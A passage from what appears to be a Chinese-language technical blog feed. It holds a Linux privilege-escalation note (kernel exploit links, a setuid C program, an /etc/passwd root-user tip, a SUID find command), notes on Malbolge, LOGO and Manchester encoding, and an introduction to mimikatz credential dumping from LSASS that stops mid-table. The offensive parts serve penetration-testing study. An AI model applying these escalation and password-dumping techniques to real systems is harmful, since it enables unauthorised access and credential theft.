<p>https://www.exploit-db.com/exploits/37292/</p>
<p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root
Exploit</p>
<p>https://www.exploit-db.com/exploits/39166/</p>
<p>Linux Kernel 4.3.3 – 'overlayfs' Local Privilege Escalation</p>
<p>https://www.exploit-db.com/exploits/39230/</p>
<blockquote>
<p>提示：内核exploit提权有风险，有可能会崩溃系统。</p>
</blockquote>
<h2 id="利用root无密码执行">利用root无密码执行</h2>
<p>简单来说，就是一个脚本，比如 py,sh 等或者是一个命令。这个文件可以以
root
身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。</p>
<p>比如常见的：</p>
<ul>
<li>写入一个 root 身份权限的用户进入 <code>/etc/passwd</code>
文件中</li>
</ul>
<h2 id="利用环境变量提权">利用环境变量提权</h2>
<p><code>PATH</code> 是 Linux 和 Unix
操作系统中的环境变量，它指定存储可执行程序的所有 bin 和 sbin
目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有
<code>/sbin</code> 和 <code>/usr/sbin</code>
条目，以便于系统管理命令的执行。</p>
<p>使用echo命令显示当前PATH环境变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<p>如果你在PATH变量中看到<code>.</code>，则意味着登录用户可以从当前目录执行二进制文件/脚本</p>
<p>我们先编译一个可执行文件shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// aaa.c</span><br></pre></td></tr></table></figure>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164152-e392c15c-b2d1-1.png"><img src="/linux-privilege-escalation-note/20200620164152-e392c15c-b2d1-1.png"></a></p>
<p>在给该文件赋予权限。</p>
<p>然后查看它的权限可以发现是有<code>s</code> 位，即suid。</p>
<p>现在我们在目标机器上用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>
来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png"><img src="/linux-privilege-escalation-note/20200620164258-0afb894a-b2d2-1.png"></a></p>
<p>更多的操作可以参考：https://xz.aliyun.com/t/2767</p>
<h2 id="利用存在漏洞的命令">利用存在漏洞的命令</h2>
<p>不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用<code>searchsploit</code>
来寻找可利用的 exp。</p>
<p>或者还可以使用 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>
来查找漏洞。</p>
<h2 id="更多">更多</h2>
<p>更多相关的可以查看 <a href="https://xz.aliyun.com/t/7924">https://xz.aliyun.com/t/7924</a></p>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>malbolge编程语言笔记</title>
    <url>//malbolge-language-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>Malbolge 由 Ben Olmstead 于 1998
年发明。这种晦涩语言被认为是最复杂的编程语言。</p>
<p>据说 Malbolge 编程语言的作者从未使用该语言编写任何程序。Olmstead
发明该语言近两年后，Malbolge 中的 hello world 代码才出现。</p>
<p>这门编程语言使用反直觉的<strong>疯狂运算</strong> (crazy
operation)，<strong>三基运算</strong> (base-three arithmetic)
和<strong>自修改代码</strong> (self-altering code) 来运行程序。</p>
<p>它的难度在早期的<strong>深奥语言</strong> (esoteric languages)
之上，例如 Brainfuck 和 Befunge。</p>
<h1 id="设计">设计</h1>
<p>Malbolge 的实现基于三元虚拟机。</p>
<blockquote>
<p>在实现上，编译器停止执行 33-126 范围之外的数据
(即仅对可见字符有效)</p>
</blockquote>
<h2 id="寄存器">寄存器</h2>
<ul>
<li><strong>a</strong> → 累加器 (accumulator)，用于写操作和标准 I/O</li>
<li><strong>c</strong> → 代码指针 (code pointer)，指向当前指令</li>
<li><strong>d</strong> → 数据指针 (data
pointer)，自动递增，指向数据操作指令</li>
</ul>
<h2 id="指针符号">指针符号</h2>
<ul>
<li>寄存器 <strong>d</strong> 可以保存一个内存地址</li>
<li><strong>[d]</strong> 是寄存器间接寻址 (register indirect)</li>
<li><strong>[c]</strong> 是类似的</li>
</ul>
<h2 id="内存">内存</h2>
<p>数据是以三进制形式保存的（包括内存地址）。</p>
<p>不同的实现有不同的内存限制，存在无内存限制的版本 (Malbolge
Unshackled)。</p>
<h2 id="指令">指令</h2>
<p>Malbolge 有八个指令，通过取值 <strong>[c]</strong>
来确定要执行的指令，与 <strong>c</strong> 的值相加，得到的结果模
94，得到虚拟机对应的操作指令：</p>
<table>
<colgroup>
<col style="width: 14%">
<col style="width: 22%">
<col style="width: 63%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">([c] + c) % 94</th>
<th style="text-align: center;">操作指令</th>
<th style="text-align: center;">用途</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">4</td>
<td style="text-align: center;">jmp [d]</td>
<td style="text-align: center;">将 <strong>[d]</strong> 值赋值给
<strong>c</strong>。需要注意的是 <strong>c</strong>
还是会自增，因此执行的下一条指令是 <strong>[d] + 1 (mod
59049)</strong>。</td>
</tr>
<tr class="even">
<td style="text-align: center;">5</td>
<td style="text-align: center;">out a</td>
<td style="text-align: center;">以 ASCII 码的形式输出 <strong>a</strong>
的值到屏幕</td>
</tr>
<tr class="odd">
<td style="text-align: center;">23</td>
<td style="text-align: center;">in a</td>
<td style="text-align: center;">将输入字符以 ASCII 码的形式赋值给
<strong>a</strong>。换行符为 10；EOF 标识符是 59048。</td>
</tr>
<tr class="even">
<td style="text-align: center;">39</td>
<td style="text-align: center;">rotr [d] mov a, [d]</td>
<td style="text-align: center;">将 <strong>[d]</strong> 值旋转 (例如
000211111<strong>2</strong> 变为
<strong>2</strong>000211111)，并将结果保存在 <strong>[d]</strong> 和
<strong>a</strong>。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">40</td>
<td style="text-align: center;">mov d, [d]</td>
<td style="text-align: center;">将 <strong>[d]</strong> 值赋值给
<strong>d</strong>。</td>
</tr>
<tr class="even">
<td style="text-align: center;">62</td>
<td style="text-align: center;">crz [d], a mov a, [d]</td>
<td style="text-align: center;">将<strong>[d]</strong>的值和<strong>a</strong>的值进行<strong>疯狂操作</strong>
(crazy operation)，并将结果保存在 <strong>[d]</strong> 和
<strong>a</strong>。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">68</td>
<td style="text-align: center;">nop</td>
<td style="text-align: center;">不做任何事。</td>
</tr>
<tr class="even">
<td style="text-align: center;">81</td>
<td style="text-align: center;">end</td>
<td style="text-align: center;">结束程序。</td>
</tr>
<tr class="odd">
<td style="text-align: center;">default</td>
<td style="text-align: center;">nop</td>
<td style="text-align: center;">不做任何事。但需要注意的是有部分
Malbolge 实现不会接受这样的操作数。</td>
</tr>
</tbody>
</table>
<p>在执行每条指令后，有罪的指令 (guilty instruction)
会被加密，以便下一次执行该指令的时候不会做相同的事，除非刚刚发生了一次跳转。然后，<strong>c</strong>
和 <strong>d</strong> 的值都加 1 并执行下一条指令。</p>
<h2 id="疯狂操作-crazy-operation">疯狂操作 (crazy operation)</h2>
<p>对于两个输入的三进制数，使用下表来获取结果。</p>
<p>例如 <strong>crz 0001112220, 0120120120</strong> 得到结果
<strong>1001022211</strong></p>
<figure>
<img src="/malbolge-language-note/crz.png" alt="crz">
<figcaption aria-hidden="true">crz</figcaption>
</figure>
<h2 id="加密">加密</h2>
<p>执行指令后，<strong>[c]</strong>
处的值（不添加任何内容）将替换为自身的值模
94。然后，使用下表找到结果值对应加密值，将加密值赋值给
<strong>[c]</strong>。</p>
<table>
<colgroup>
<col style="width: 8%">
<col style="width: 12%">
<col style="width: 8%">
<col style="width: 12%">
<col style="width: 8%">
<col style="width: 12%">
<col style="width: 8%">
<col style="width: 12%">
<col style="width: 8%">
<col style="width: 12%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">Result</th>
<th style="text-align: center;">Encrypted</th>
<th style="text-align: center;">Result</th>
<th style="text-align: center;">Encrypted</th>
<th style="text-align: center;">Result</th>
<th style="text-align: center;">Encrypted</th>
<th style="text-align: center;">Result</th>
<th style="text-align: center;">Encrypted</th>
<th style="text-align: center;">Result</th>
<th style="text-align: center;">Encrypted</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><strong>0</strong></td>
<td style="text-align: center;">57</td>
<td style="text-align: center;"><strong>19</strong></td>
<td style="text-align: center;">108</td>
<td style="text-align: center;"><strong>38</strong></td>
<td style="text-align: center;">113</td>
<td style="text-align: center;"><strong>57</strong></td>
<td style="text-align: center;">91</td>
<td style="text-align: center;"><strong>76</strong></td>
<td style="text-align: center;">79</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>1</strong></td>
<td style="text-align: center;">109</td>
<td style="text-align: center;"><strong>20</strong></td>
<td style="text-align: center;">125</td>
<td style="text-align: center;"><strong>39</strong></td>
<td style="text-align: center;">116</td>
<td style="text-align: center;"><strong>58</strong></td>
<td style="text-align: center;">37</td>
<td style="text-align: center;"><strong>77</strong></td>
<td style="text-align: center;">65</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>2</strong></td>
<td style="text-align: center;">60</td>
<td style="text-align: center;"><strong>21</strong></td>
<td style="text-align: center;">82</td>
<td style="text-align: center;"><strong>40</strong></td>
<td style="text-align: center;">121</td>
<td style="text-align: center;"><strong>59</strong></td>
<td style="text-align: center;">92</td>
<td style="text-align: center;"><strong>78</strong></td>
<td style="text-align: center;">49</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>3</strong></td>
<td style="text-align: center;">46</td>
<td style="text-align: center;"><strong>22</strong></td>
<td style="text-align: center;">69</td>
<td style="text-align: center;"><strong>41</strong></td>
<td style="text-align: center;">102</td>
<td style="text-align: center;"><strong>60</strong></td>
<td style="text-align: center;">51</td>
<td style="text-align: center;"><strong>79</strong></td>
<td style="text-align: center;">67</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>4</strong></td>
<td style="text-align: center;">84</td>
<td style="text-align: center;"><strong>23</strong></td>
<td style="text-align: center;">111</td>
<td style="text-align: center;"><strong>42</strong></td>
<td style="text-align: center;">114</td>
<td style="text-align: center;"><strong>61</strong></td>
<td style="text-align: center;">100</td>
<td style="text-align: center;"><strong>80</strong></td>
<td style="text-align: center;">66</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>5</strong></td>
<td style="text-align: center;">86</td>
<td style="text-align: center;"><strong>24</strong></td>
<td style="text-align: center;">107</td>
<td style="text-align: center;"><strong>43</strong></td>
<td style="text-align: center;">36</td>
<td style="text-align: center;"><strong>62</strong></td>
<td style="text-align: center;">76</td>
<td style="text-align: center;"><strong>81</strong></td>
<td style="text-align: center;">54</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>6</strong></td>
<td style="text-align: center;">97</td>
<td style="text-align: center;"><strong>25</strong></td>
<td style="text-align: center;">78</td>
<td style="text-align: center;"><strong>44</strong></td>
<td style="text-align: center;">40</td>
<td style="text-align: center;"><strong>63</strong></td>
<td style="text-align: center;">43</td>
<td style="text-align: center;"><strong>82</strong></td>
<td style="text-align: center;">118</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>7</strong></td>
<td style="text-align: center;">99</td>
<td style="text-align: center;"><strong>26</strong></td>
<td style="text-align: center;">58</td>
<td style="text-align: center;"><strong>45</strong></td>
<td style="text-align: center;">119</td>
<td style="text-align: center;"><strong>64</strong></td>
<td style="text-align: center;">81</td>
<td style="text-align: center;"><strong>83</strong></td>
<td style="text-align: center;">94</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>8</strong></td>
<td style="text-align: center;">96</td>
<td style="text-align: center;"><strong>27</strong></td>
<td style="text-align: center;">35</td>
<td style="text-align: center;"><strong>46</strong></td>
<td style="text-align: center;">101</td>
<td style="text-align: center;"><strong>65</strong></td>
<td style="text-align: center;">59</td>
<td style="text-align: center;"><strong>84</strong></td>
<td style="text-align: center;">61</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>9</strong></td>
<td style="text-align: center;">117</td>
<td style="text-align: center;"><strong>28</strong></td>
<td style="text-align: center;">63</td>
<td style="text-align: center;"><strong>47</strong></td>
<td style="text-align: center;">52</td>
<td style="text-align: center;"><strong>66</strong></td>
<td style="text-align: center;">62</td>
<td style="text-align: center;"><strong>85</strong></td>
<td style="text-align: center;">73</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>10</strong></td>
<td style="text-align: center;">89</td>
<td style="text-align: center;"><strong>29</strong></td>
<td style="text-align: center;">71</td>
<td style="text-align: center;"><strong>48</strong></td>
<td style="text-align: center;">123</td>
<td style="text-align: center;"><strong>67</strong></td>
<td style="text-align: center;">85</td>
<td style="text-align: center;"><strong>86</strong></td>
<td style="text-align: center;">95</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>11</strong></td>
<td style="text-align: center;">42</td>
<td style="text-align: center;"><strong>30</strong></td>
<td style="text-align: center;">34</td>
<td style="text-align: center;"><strong>49</strong></td>
<td style="text-align: center;">87</td>
<td style="text-align: center;"><strong>68</strong></td>
<td style="text-align: center;">33</td>
<td style="text-align: center;"><strong>87</strong></td>
<td style="text-align: center;">48</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>12</strong></td>
<td style="text-align: center;">77</td>
<td style="text-align: center;"><strong>31</strong></td>
<td style="text-align: center;">105</td>
<td style="text-align: center;"><strong>50</strong></td>
<td style="text-align: center;">80</td>
<td style="text-align: center;"><strong>69</strong></td>
<td style="text-align: center;">112</td>
<td style="text-align: center;"><strong>88</strong></td>
<td style="text-align: center;">47</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>13</strong></td>
<td style="text-align: center;">75</td>
<td style="text-align: center;"><strong>32</strong></td>
<td style="text-align: center;">64</td>
<td style="text-align: center;"><strong>51</strong></td>
<td style="text-align: center;">41</td>
<td style="text-align: center;"><strong>70</strong></td>
<td style="text-align: center;">74</td>
<td style="text-align: center;"><strong>89</strong></td>
<td style="text-align: center;">56</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>14</strong></td>
<td style="text-align: center;">39</td>
<td style="text-align: center;"><strong>33</strong></td>
<td style="text-align: center;">53</td>
<td style="text-align: center;"><strong>52</strong></td>
<td style="text-align: center;">72</td>
<td style="text-align: center;"><strong>71</strong></td>
<td style="text-align: center;">83</td>
<td style="text-align: center;"><strong>90</strong></td>
<td style="text-align: center;">124</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>15</strong></td>
<td style="text-align: center;">88</td>
<td style="text-align: center;"><strong>34</strong></td>
<td style="text-align: center;">122</td>
<td style="text-align: center;"><strong>53</strong></td>
<td style="text-align: center;">45</td>
<td style="text-align: center;"><strong>72</strong></td>
<td style="text-align: center;">55</td>
<td style="text-align: center;"><strong>91</strong></td>
<td style="text-align: center;">106</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>16</strong></td>
<td style="text-align: center;">126</td>
<td style="text-align: center;"><strong>35</strong></td>
<td style="text-align: center;">93</td>
<td style="text-align: center;"><strong>54</strong></td>
<td style="text-align: center;">90</td>
<td style="text-align: center;"><strong>73</strong></td>
<td style="text-align: center;">50</td>
<td style="text-align: center;"><strong>92</strong></td>
<td style="text-align: center;">115</td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>17</strong></td>
<td style="text-align: center;">120</td>
<td style="text-align: center;"><strong>36</strong></td>
<td style="text-align: center;">38</td>
<td style="text-align: center;"><strong>55</strong></td>
<td style="text-align: center;">110</td>
<td style="text-align: center;"><strong>74</strong></td>
<td style="text-align: center;">70</td>
<td style="text-align: center;"><strong>93</strong></td>
<td style="text-align: center;">98</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>18</strong></td>
<td style="text-align: center;">68</td>
<td style="text-align: center;"><strong>37</strong></td>
<td style="text-align: center;">103</td>
<td style="text-align: center;"><strong>56</strong></td>
<td style="text-align: center;">44</td>
<td style="text-align: center;"><strong>75</strong></td>
<td style="text-align: center;">104</td>
<td style="text-align: center;"></td>
<td style="text-align: center;"></td>
</tr>
</tbody>
</table>
<p>Lou Scheffer 对 Malbolge
的密码分析提到了排列中的六个不同的循环。它们在这里列出：</p>
<ul>
<li>33 ⇒ 53 ⇒ 45 ⇒ 119 ⇒ 78 ⇒ 49 ⇒ 87 ⇒ 48 ⇒ 123 ⇒ 71 ⇒ 83 ⇒ 94 ⇒ 57 ⇒
91 ⇒ 106 ⇒ 77 ⇒ 65 ⇒ 59 ⇒ 92 ⇒ 115 ⇒ 82 ⇒ 118 ⇒ 107 ⇒ 75 ⇒ 104 ⇒ 89 ⇒ 56
⇒ 44 ⇒ 40 ⇒ 121 ⇒ 35 ⇒ 93 ⇒ 98 ⇒ 84 ⇒ 61 ⇒ 100 ⇒ 97 ⇒ 46 ⇒ 101 ⇒ 99 ⇒ 86
⇒ 95 ⇒ 109 ⇒ 88 ⇒ 47 ⇒ 52 ⇒ 72 ⇒ 55 ⇒ 110 ⇒ 126 ⇒ 64 ⇒ 81 ⇒ 54 ⇒ 90 ⇒
124 ⇒ 34 ⇒ 122 ⇒ 63 ⇒ 43 ⇒ 36 ⇒ 38 ⇒ 113 ⇒ 108 ⇒ 39 ⇒ 116 ⇒ 69 ⇒ 112 ⇒
68 ⇒ 33 ...</li>
<li>37 ⇒ 103 ⇒ 117 ⇒ 111 ⇒ 120 ⇒ 58 ⇒ 37 ...</li>
<li>41 ⇒ 102 ⇒ 96 ⇒ 60 ⇒ 51 ⇒ 41 ...</li>
<li>42 ⇒ 114 ⇒ 125 ⇒ 105 ⇒ 42 ...</li>
<li>50 ⇒ 80 ⇒ 66 ⇒ 62 ⇒ 76 ⇒ 79 ⇒ 67 ⇒ 85 ⇒ 73 ⇒ 50 ...</li>
<li>70 ⇒ 74 ⇒ 70 ...</li>
</ul>
<p>这些循环可用于创建每次执行不同操作并最终变得重复的循环。</p>
<h1 id="示例代码">示例代码</h1>
<h2 id="hello-world">Hello, World!</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(=&lt;`#9]~6ZY327Uv4-QsqpMn&amp;+Ij&quot;&#x27;E%e&#123;Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV&gt;gY;dts76qKJImZkj</span><br></pre></td></tr></table></figure>
<h1 id="编辑与运行">编辑与运行</h1>
<p>我们可以使用在线网站来编辑和运行我们的 malbolge 程序：</p>
<ul>
<li><a href="https://malbolge.doleczek.pl/">https://malbolge.doleczek.pl/</a></li>
<li><a href="https://www.tutorialspoint.com/execute_malbolge_online.php">https://www.tutorialspoint.com/execute_malbolge_online.php</a></li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>language</tag>
      </tags>
  </entry>
  <entry>
    <title>LOGO语言笔记</title>
    <url>//logo-language-note.html</url>
    <content><![CDATA[<h1 id="logo-语言">LOGO 语言</h1>
<h2 id="简述">简述</h2>
<p>LOGO
是一门早期的简单易懂的语言，通常用来入门计算机编程，作为早教使用。</p>
<p>这门语言通过操作小乌龟，使得其在<strong>画布</strong>上作出各种各样的图形，现如今早已被各种编程语言所替代（例如
Python 的 <code>turtle</code> 模块）。</p>
<h2 id="语法">语法</h2>
<table>
<thead>
<tr class="header">
<th>指令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>FD 100</td>
<td>使小乌龟前进 100 步</td>
</tr>
<tr class="even">
<td>RT 90</td>
<td>使小乌龟右转（顺时针） 90º</td>
</tr>
<tr class="odd">
<td>LT 90</td>
<td>使小乌龟左转（逆时针） 90º</td>
</tr>
<tr class="even">
<td>BK 100</td>
<td>使小乌龟退后 100 步</td>
</tr>
<tr class="odd">
<td>PU</td>
<td>拾起画笔（使小乌龟的路径不显现）</td>
</tr>
<tr class="even">
<td>PD</td>
<td>放下画笔（使小乌龟的路径显现）</td>
</tr>
<tr class="odd">
<td>CS</td>
<td>清屏并重新开始</td>
</tr>
<tr class="even">
<td>HT</td>
<td>隐藏小乌龟</td>
</tr>
<tr class="odd">
<td>ST</td>
<td>显示小乌龟</td>
</tr>
<tr class="even">
<td>REPEAT 3 [...]</td>
<td>重复命令三次</td>
</tr>
<tr class="odd">
<td>HOME</td>
<td>将小乌龟重置到屏幕中心</td>
</tr>
<tr class="even">
<td>SETXY 20 20</td>
<td>将小乌龟的位置设置为 (20, 20)</td>
</tr>
<tr class="odd">
<td>ARC 90 50</td>
<td>创建半径为 50，角度为 90º 的圆弧</td>
</tr>
</tbody>
</table>
<h2 id="实例">实例</h2>
<table>
<colgroup>
<col style="width: 45%">
<col style="width: 54%">
</colgroup>
<thead>
<tr class="header">
<th><strong>命令</strong></th>
<th><strong>输出</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>cs fd 100 rt 90 fd 100 rt 90 fd 100 rt 90 fd 100</code></td>
<td><img src="/logo-language-note/image009.png" alt="image009"></td>
</tr>
<tr class="even">
<td><code>cs fd 100 rt 120 fd 100 rt 120 fd 100</code></td>
<td><img src="/logo-language-note/image010.png" alt="image010"></td>
</tr>
<tr class="odd">
<td><code>cs rt 90 fd 100 rt 120 fd 100 rt 120 fd 100</code></td>
<td><img src="/logo-language-note/image011.png" alt="image011"></td>
</tr>
<tr class="even">
<td><code>cs lt 30 fd 100 rt 120 fd 100 rt 120 fd 100</code></td>
<td><img src="/logo-language-note/image012.png" alt="image012"></td>
</tr>
<tr class="odd">
<td><code>cs fd 100 rt 90 fd 110 rt 90 fd 120 rt 90 fd 130</code></td>
<td><img src="/logo-language-note/image013-16588977790712.png" alt="image013"></td>
</tr>
</tbody>
</table>
<h2 id="运行">运行</h2>
<p>我们可以在在线网站中输入代码，让小乌龟开始绘图：https://www.calormen.com/jslogo/</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>LOGO</tag>
      </tags>
  </entry>
  <entry>
    <title>曼彻斯特编码笔记</title>
    <url>//manchester-note.html</url>
    <content><![CDATA[<h1 id="曼彻斯特编码">曼彻斯特编码</h1>
<h2 id="简述">简述</h2>
<p>曼彻斯特编码也称为相位编码，是一种同步时钟编码技术。通过电平的高低转换来表示“0”或“1”，每一位的中间有一个跳变的动作，这个动作既作时钟信号，又作数据信号，但因为每一个码元都被调成两个电平，所以数据传输速率只有调制速率的1/2，其编码效率为50%。</p>
<p>常用于局域网传输和物联网传输中，例如传感器、蓝牙数据等。</p>
<figure>
<img src="/manchester-note/image-20220906220031954.png" alt="image-20220906220031954">
<figcaption aria-hidden="true">image-20220906220031954</figcaption>
</figure>
<h2 id="nrz-编码不归零码">NRZ 编码（不归零码）</h2>
<p>NRZ 编码是我们最常见的编码之一，表示方式是：</p>
<ul>
<li>正电平表示 1</li>
<li>低电平表示 0</li>
</ul>
<p>它与 RZ
码的区别就是它<strong>不归零</strong>，即一个周期可以全部用来传输数据，这样传输的带宽就可以完全利用。</p>
<figure>
<img src="/manchester-note/20150612043848848.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="曼彻斯特编码-1">曼彻斯特编码</h2>
<p>曼彻斯特编码有两种表示方法：</p>
<ol type="1">
<li><p>第一种是 G. E. Thomas, Andrew S. Tanenbaum 在1949年提出的：</p>
<p>位中间电平 从低到高 跳变表示"0"；</p>
<p>位中间电平 从高到低 跳变表示"1"。</p>
<p>此规则得到的编码表如下：</p>
<table>
<thead>
<tr class="header">
<th>编码</th>
<th>原数据</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>0101 (0x5)</code></td>
<td><code>00</code></td>
</tr>
<tr class="even">
<td><code>1001 (0x9)</code></td>
<td><code>10</code></td>
</tr>
<tr class="odd">
<td><code>0110 (0x6)</code></td>
<td><code>01</code></td>
</tr>
<tr class="even">
<td><code>1010 (0xA)</code></td>
<td><code>11</code></td>
</tr>
</tbody>
</table></li>
<li><p>第二种是 IEEE 802.4 (令牌总线) 和低速版的 IEEE 802.3 (以太网)
中规定：</p>
<p>位中间电平 从低到高 跳变表示"1"；</p>
<p>位中间电平 从高到低 跳变表示"0"。</p>
<p>此规则得到的编码表如下：</p>
<table>
<thead>
<tr class="header">
<th>编码</th>
<th>原数据</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>0101 (0x5)</code></td>
<td><code>11</code></td>
</tr>
<tr class="even">
<td><code>1001 (0x9)</code></td>
<td><code>01</code></td>
</tr>
<tr class="odd">
<td><code>0110 (0x6)</code></td>
<td><code>10</code></td>
</tr>
<tr class="even">
<td><code>1010 (0xA)</code></td>
<td><code>00</code></td>
</tr>
</tbody>
</table></li>
</ol>
<figure>
<img src="/manchester-note/98bb9a979a1446ceb8f4f65dfabe2f2d.png" alt="98bb9a979a1446ceb8f4f65dfabe2f2d">
<figcaption aria-hidden="true">98bb9a979a1446ceb8f4f65dfabe2f2d</figcaption>
</figure>
<p><strong>在实际应用中，若无特殊说明，曼彻斯特码的编码规则均采用第二种约定。</strong></p>
<h2 id="差分曼彻斯特编码">差分曼彻斯特编码</h2>
<p>差分曼彻斯特编码的表示方式如下：</p>
<ol type="1">
<li>初信号与<strong>标准曼彻斯特编码</strong>用一样的规则</li>
<li>初信号之后的信号，如果发生了跳变（改变信号极性）则表示
0；如果未发生跳变（未改变信号极性）则表示 1</li>
</ol>
<figure>
<img src="/manchester-note/20190126155852554.png" alt="20190126155852554">
<figcaption aria-hidden="true">20190126155852554</figcaption>
</figure>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>mimikatz使用笔记</title>
    <url>//mimikatz-note.html</url>
    <content><![CDATA[<h1 id="mimikatz-介绍">mimikatz 介绍</h1>
<p>mimikatz 是法国人 benjamin
开发的一款功能强大的轻量级调试工具，本来是用于个人测试使用，但由于功能过于强大，可以直接获取
Windows 操作系统的明文密码，现被用于渗透测试。</p>
<p>mimikatz 分为 Win32 与 x64 版本，在 kali
中有存储，直接将文件夹拷贝即可使用。通过这些可以提升进程权限、注入进程和读取进程内存。</p>
<blockquote>
<p>├── kiwi_passwords.yar</p>
<p>├── mimicom.idl</p>
<p>├── Win32</p>
<p>│ ├── mimidrv.sys</p>
<p>│ ├── mimikatz.exe</p>
<p>│ ├── mimilib.dll</p>
<p>│ ├── mimilove.exe</p>
<p>│ └── mimispool.dll</p>
<p>└── x64</p>
<p>├── mimidrv.sys</p>
<p>├── mimikatz.exe</p>
<p>├── mimilib.dll</p>
<p>└── mimispool.dll</p>
</blockquote>
<p>mimikatz 主要是从 Lsass
中获取当前登陆过的系统用户的账号明文密码。Lsass 是微软 Windows
系统的安全机制，主要用于本地安全和登陆策略，通常我们登录系统后，经过其
wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法加密并存储在 Lsass
内存中，而 mimikatz 正是通过逆算获取到明文密码。</p>
<p>mimikatz 可以在 GitHub
主页中获取相应的发行（https://github.com/gentilkiwi/mimikatz/），同时也可以在
kali 中拷贝。</p>
<h1 id="mimikatz-使用">mimikatz 使用</h1>
<p>mimikatz 打开后便是一个交互式的
shell，其内置许多模块功能供我们使用，主要是通过
<code>模块名::命令 [参数]</code> 来使用 mimikatz 的各种功能。</p>
<h2 id="模块">模块</h2>
<p>以下仅是常用模块及命令</p>
<ul>
<li><a href="#standard"><code>standard</code></a></li>
<li><a href="#privilege"><code>privilege</code></a></li>
<li><a href="#sekurlsa"><code>sekurlsa</code></a></li>
</ul>
<p>注：所有模块都可以通过 <code>模块名::错误命令</code>
获取详细帮助，例如 <code>crypto::help</code>，如果需要详细信息请在官方
wiki 中查找：https://github.com/gentilkiwi/mimikatz/wiki</p>
<h3 id="standard"><code>standard</code></h3>
<p><code>standard</code>
模块的命令可以直接使用，并不需要指定模块名，即</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
<p>也可以正常使用该模块的命令。</p>
<table>
<colgroup>
<col style="width: 13%">
<col style="width: 86%">
</colgroup>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>exit</code></td>
<td>退出 mimikatz</td>
</tr>
<tr class="even">
<td><code>cls</code></td>
<td>清屏</td>
</tr>
<tr class="odd">
<td><code>answer</code></td>
<td>彩蛋（<code>Gives the Answer to the Ultimate Question of Life, the Universe, and Everything.</code>）</td>
</tr>
<tr class="even">
<td><code>coffee</code></td>
<td>彩蛋（<code>Because everyone deserves a good coffee.</code>）</td>
</tr>
<tr class="odd">
<td><code>sleep</code></td>
<td>休眠，以毫秒为单位（默认值为 1000）</td>
</tr>
<tr class="even">
<td><code>log</code></td>
<td>输出日志，可以指定输出文件名（默认为
<code>mimikatz.log</code>），使用 <code>/stop</code> 参数停止记录</td>
</tr>
<tr class="odd">
<td><code>base64</code></td>
<td>切换输入输出为 base64 形式</td>
</tr>
<tr class="even">
<td><code>version</code></td>
<td>获取 mimikatz 的版本和 windows 的版本</td>
</tr>
<tr class="odd">
<td><code>cd</code></td>
<td>切换工作目录</td>
</tr>
</tbody>
</table>
<h3 id="privilege"><code>privilege</code></h3>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>debug</code></td>
<td>请求调试权限</td>
